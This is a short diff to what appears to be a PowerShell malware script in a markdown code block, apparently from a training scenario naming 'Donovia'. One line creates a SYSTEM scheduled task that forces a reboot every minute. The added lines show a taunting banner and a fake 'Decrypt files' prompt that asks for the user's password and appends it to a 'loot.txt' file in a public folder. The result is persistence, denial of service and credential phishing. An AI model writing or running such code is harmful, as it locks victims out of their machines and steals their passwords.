@@ -35,5 +35,7 @@ schtasks.exe /create /tn "Effect" /tr "shutdown /r /t 000" /ru "SYSTEM" /sc minu
 [console]::beep(349,350)
 [console]::beep(523,150)
 [console]::beep(440,1000)
-[+] Donovia Rulez!
+Write-Host "[+] Donovia Rulez!"
+Read-Host "[+] Decrypt files with $($env:USERNAME) password" | Out-File -Append C:\Users\Public\loot.txt
+Start-Sleep -Seconds 5
 ```
